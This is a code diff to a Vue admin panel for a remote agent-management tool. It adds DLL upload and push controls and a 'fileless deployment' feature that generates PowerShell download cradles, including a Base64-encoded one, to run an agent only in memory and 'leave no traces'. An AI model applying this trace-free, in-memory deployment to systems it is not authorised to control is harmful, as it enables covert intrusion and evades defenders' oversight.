@@ -235,6 +235,9 @@
                 <el-button type="warning" :loading="linuxPushing" :disabled="!linuxBinInfo.exists" @click="pushUpdate('linux')">
                   一键推送更新
                 </el-button>
+                <el-button type="danger" :loading="linuxForcePushing" :disabled="!linuxBinInfo.exists" @click="forceUpdateLinux">
+                  强制更新(兼容旧版)
+                </el-button>
                 <span v-if="linuxPushResult" class="push-result" :class="{ success: linuxPushResult.includes('成功') }">{{ linuxPushResult }}</span>
               </div>
             </div>
@@ -272,6 +275,87 @@
                   强制更新(兼容旧版)
                 </el-button>
                 <span v-if="winPushResult" class="push-result" :class="{ success: winPushResult.includes('成功') }">{{ winPushResult }}</span>
+              </div>
+            </div>
+          </div>
+
+          <!-- 无文件下发 -->
+          <div class="agent-update-section" style="margin-top: 20px">
+            <div class="platform-title">👻 无文件下发（Windows）</div>
+            <div style="color:var(--t3);font-size:12px;margin-bottom:14px;line-height:1.6">
+              生成 PowerShell 一行命令，在目标机器上执行后 Agent 纯内存运行，全程零文件落盘。<br/>
+              适用于快速临时部署、不留痕迹的场景。
+            </div>
+            <div class="info-grid" style="margin-bottom: 16px">
+              <div class="info-item">
+                <span class="info-label">MiniAgent.dll</span>
+                <span class="info-value">{{ csDllInfo.exists ? `已上传 (${(csDllInfo.size / 1024).toFixed(1)} KB)` : '未上传' }}</span>
+              </div>
+              <div class="info-item" v-if="csDllInfo.exists">
+                <span class="info-label">上传时间</span>
+                <span class="info-value">{{ new Date(csDllInfo.modified).toLocaleString('zh-CN') }}</span>
+              </div>
+            </div>
+            <div class="agent-update-actions" style="margin-bottom:16px">
+              <div class="action-card">
+                <h4>① 上传 MiniAgent.dll</h4>
+                <p>选择编译好的 C# 无文件 Agent DLL</p>
+                <input ref="csFileInput" type="file" accept=".dll" style="display:none" @change="handleUpload($event, 'windows-cs')" />
+                <el-button type="primary" :loading="csUploading" @click="($refs.csFileInput as HTMLInputElement)?.click()">
+                  选择文件并上传
+                </el-button>
+              </div>
+              <div class="action-card">
+                <h4>② 推送 DLL 更新</h4>
+                <p>通知所有在线 C# Agent 退出并重新拉取新版 DLL</p>
+                <el-button type="warning" :loading="csPushing" :disabled="!csDllInfo.exists" @click="pushCsUpdate">
+                  一键推送更新
+                </el-button>
+                <span v-if="csPushResult" class="push-result" :class="{ success: csPushResult.includes('成功') }">{{ csPushResult }}</span>
+              </div>
+            </div>
+            <div class="agent-update-actions">
+              <div class="action-card" style="flex:1">
+                <h4>生成下发命令</h4>
+                <div style="display:flex;gap:10px;align-items:flex-end;margin-bottom:12px">
+                  <div style="flex:1">
+                    <div style="font-size:12px;color:var(--t3);margin-bottom:4px">目标机器标识（可选，用于加密隔离）</div>
+                    <el-input v-model="filelessMid" placeholder="如主机名或随机字符串" size="small" />
+                  </div>
+                  <el-button type="success" :loading="filelessGenerating" @click="generateFileless" size="small">
+                    生成命令
+                  </el-button>
+                </div>
+
+                <div v-if="filelessResult.cradle">
+                  <div v-if="filelessDeployed" style="display:flex;align-items:center;gap:8px;margin-bottom:12px;padding:10px 14px;background:rgba(82,196,26,0.1);border:1px solid rgba(82,196,26,0.3);border-radius:6px">
+                    <span style="font-size:18px">✅</span>
+                    <div>
+                      <div style="color:#52c41a;font-size:13px;font-weight:700">部署完成</div>
+                      <div style="color:#52c41a;font-size:11px;opacity:0.8">{{ filelessDeployedName }} 已成功上线</div>
+                    </div>
+                  </div>
+                  <div v-else-if="filelessWaiting" style="display:flex;align-items:center;gap:8px;margin-bottom:12px;padding:10px 14px;background:rgba(64,158,255,0.08);border:1px solid rgba(64,158,255,0.2);border-radius:6px">
+                    <el-icon class="is-loading" style="color:#409eff;font-size:16px"><Loading /></el-icon>
+                    <span style="color:#409eff;font-size:13px;font-weight:600">等待目标执行命令…（{{ filelessWaitSec }}s）</span>
+                  </div>
+                  <div style="font-size:12px;font-weight:600;color:var(--t2);margin-bottom:6px">PowerShell 一行命令</div>
+                  <div class="cmd-box" style="margin-bottom:10px">
+                    <code class="agent-cmd" style="font-size:11px;word-break:break-all">{{ filelessResult.cradle }}</code>
+                    <button type="button" class="copy-btn" @click="copyText(filelessResult.cradle)">复制</button>
+                  </div>
+
+                  <div style="font-size:12px;font-weight:600;color:var(--t2);margin-bottom:6px">Base64 编码版（适合 -EncodedCommand）</div>
+                  <div class="cmd-box" style="margin-bottom:10px">
+                    <code class="agent-cmd" style="font-size:11px;word-break:break-all">{{ filelessResult.encodedCradle }}</code>
+                    <button type="button" class="copy-btn" @click="copyText(filelessResult.encodedCradle)">复制</button>
+                  </div>
+
+                  <div class="agent-tip">
+                    <el-icon><InfoFilled /></el-icon>
+                    <span>{{ filelessResult.note }}</span>
+                  </div>
+                </div>
               </div>
             </div>
           </div>
@@ -447,10 +531,10 @@
 </template>
 
 <script setup lang="ts">
-import { ref, reactive, onMounted } from 'vue'
+import { ref, reactive, onMounted, onUnmounted } from 'vue'
 import { serverApi, alertRuleApi, authApi, securityApi, notifyApi, agentUpdateApi } from '@/api'
 import { ElMessage } from 'element-plus'
-import { InfoFilled } from '@element-plus/icons-vue'
+import { InfoFilled, Loading } from '@element-plus/icons-vue'
 import type { ServerInfo } from '@/api'
 
 const installTabs = [
@@ -501,13 +585,19 @@ const linuxFileInput = ref<HTMLInputElement>()
 const winFileInput = ref<HTMLInputElement>()
 const linuxBinInfo = reactive({ exists: false, size: 0, modified: '' })
 const winBinInfo = reactive({ exists: false, size: 0, modified: '' })
+const csDllInfo = reactive({ exists: false, size: 0, modified: '' })
 const linuxUploading = ref(false)
 const winUploading = ref(false)
+const csUploading = ref(false)
+const csFileInput = ref<HTMLInputElement>()
 const linuxPushing = ref(false)
 const winPushing = ref(false)
 const winForcePushing = ref(false)
+const linuxForcePushing = ref(false)
 const linuxPushResult = ref('')
 const winPushResult = ref('')
+const csPushing = ref(false)
+const csPushResult = ref('')
 
 async function fetchAgentBinInfo() {
   try {
@@ -515,6 +605,7 @@ async function fetchAgentBinInfo() {
     if (res.success) {
       if (res.data.linux) Object.assign(linuxBinInfo, res.data.linux)
       if (res.data.windows) Object.assign(winBinInfo, res.data.windows)
+      if (res.data['windows-cs']) Object.assign(csDllInfo, res.data['windows-cs'])
     }
   } catch {}
 }
@@ -522,13 +613,16 @@ async function fetchAgentBinInfo() {
 async function handleUpload(e: Event, platform: string) {
   const file = (e.target as HTMLInputElement).files?.[0]
   if (!file) return
-  const uploading = platform === 'linux' ? linuxUploading : winUploading
-  const inputRef = platform === 'linux' ? linuxFileInput : winFileInput
+  const uploading = platform === 'windows-cs' ? csUploading : (platform === 'linux' ? linuxUploading : winUploading)
+  const inputRef = platform === 'windows-cs' ? csFileInput : (platform === 'linux' ? linuxFileInput : winFileInput)
   uploading.value = true
   try {
     const res: any = await agentUpdateApi.upload(file, platform)
     if (res.success) {
-      ElMessage.success(`${platform} Agent 上传成功 (${(res.data.size / 1024 / 1024).toFixed(2)} MB)`)
+      const sizeStr = platform === 'windows-cs'
+        ? `${(res.data.size / 1024).toFixed(1)} KB`
+        : `${(res.data.size / 1024 / 1024).toFixed(2)} MB`
+      ElMessage.success(`${platform === 'windows-cs' ? 'MiniAgent.dll' : platform + ' Agent'} 上传成功 (${sizeStr})`)
       fetchAgentBinInfo()
     } else {
       ElMessage.error(res.error || '上传失败')
@@ -563,6 +657,27 @@ async function pushUpdate(platform: string) {
   }
 }
 
+async function pushCsUpdate() {
+  csPushing.value = true
+  csPushResult.value = ''
+  try {
+    // C# Agent 注册为 windows，复用 pushUpdate API
+    const res: any = await agentUpdateApi.pushUpdate('windows')
+    if (res.success) {
+      csPushResult.value = `推送成功，已通知 ${res.data.sent} 个 Agent 重新拉取 DLL`
+      ElMessage.success(csPushResult.value)
+    } else {
+      csPushResult.value = res.error || '推送失败'
+      ElMessage.error(csPushResult.value)
+    }
+  } catch (err: any) {
+    csPushResult.value = '推送失败: ' + (err.message || err)
+    ElMessage.error(csPushResult.value)
+  } finally {
+    csPushing.value = false
+  }
+}
+
 async function forceUpdateWin() {
   winForcePushing.value = true
   winPushResult.value = ''
@@ -582,6 +697,107 @@ async function forceUpdateWin() {
     winForcePushing.value = false
   }
 }
+
+async function forceUpdateLinux() {
+  linuxForcePushing.value = true
+  linuxPushResult.value = ''
+  try {
+    const res: any = await agentUpdateApi.forceUpdateLinux()
+    if (res.success) {
+      linuxPushResult.value = res.message || '强制更新指令已发送'
+      ElMessage.success(linuxPushResult.value)
+    } else {
+      linuxPushResult.value = res.error || '强制更新失败'
+      ElMessage.error(linuxPushResult.value)
+    }
+  } catch (err: any) {
+    linuxPushResult.value = '强制更新失败: ' + (err.message || err)
+    ElMessage.error(linuxPushResult.value)
+  } finally {
+    linuxForcePushing.value = false
+  }
+}
+
+// ── 无文件下发 ──
+const filelessMid = ref('')
+const filelessGenerating = ref(false)
+const filelessResult = reactive({ cradle: '', encodedCradle: '', note: '', deployId: '' })
+const filelessDeployed = ref(false)
+const filelessDeployedName = ref('')
+const filelessWaiting = ref(false)
+const filelessWaitSec = ref(0)
+let filelessPollTimer: ReturnType<typeof setInterval> | null = null
+let filelessTickTimer: ReturnType<typeof setInterval> | null = null
+
+function stopFilelessPoll() {
+  if (filelessPollTimer) { clearInterval(filelessPollTimer); filelessPollTimer = null }
+  if (filelessTickTimer) { clearInterval(filelessTickTimer); filelessTickTimer = null }
+  filelessWaiting.value = false
+}
+
+function startFilelessPoll(expectedDeployId: string) {
+  stopFilelessPoll()
+  filelessDeployed.value = false
+  filelessDeployedName.value = ''
+  filelessWaitSec.value = 0
+  filelessWaiting.value = true
+
+  filelessTickTimer = setInterval(() => { filelessWaitSec.value++ }, 1000)
+
+  filelessPollTimer = setInterval(async () => {
+    try {
+      const res: any = await serverApi.list()
+      if (!res.success || !res.data) return
+      for (const srv of res.data) {
+        if (srv.connectMethod !== 'agent') continue
+        if (srv.deployId === expectedDeployId) {
+          filelessDeployed.value = true
+          filelessDeployedName.value = srv.name || srv.id
+          stopFilelessPoll()
+          ElMessage.success(`部署完成：${filelessDeployedName.value} 已上线`)
+          return
+        }
+      }
+    } catch {}
+  }, 3000)
+
+  // 最多等 120 秒
+  setTimeout(() => {
+    if (!filelessDeployed.value) stopFilelessPoll()
+  }, 120000)
+}
+
+async function generateFileless() {
+  const mid = filelessMid.value.trim() || 'default'
+  filelessGenerating.value = true
+  filelessResult.cradle = ''
+  filelessResult.encodedCradle = ''
+  filelessResult.note = ''
+  filelessResult.deployId = ''
+  filelessDeployed.value = false
+  stopFilelessPoll()
+  try {
+    const res: any = await agentUpdateApi.filelessGenerate(mid)
+    if (res.success) {
+      filelessResult.cradle = res.data.cradle
+      filelessResult.encodedCradle = res.data.encodedCradle
+      filelessResult.note = res.data.note
+      filelessResult.deployId = res.data.deployId || ''
+      ElMessage.success('命令已生成，等待目标执行…')
+      if (filelessResult.deployId) {
+        startFilelessPoll(filelessResult.deployId)
+      }
+    } else {
+      ElMessage.error(res.error || '生成失败')
+    }
+  } catch (err: any) {
+    ElMessage.error('生成失败: ' + (err.message || err))
+  } finally {
+    filelessGenerating.value = false
+  }
+}
+
+onUnmounted(() => { stopFilelessPoll() })
 
 const serverForm = reactive({
   name: '',
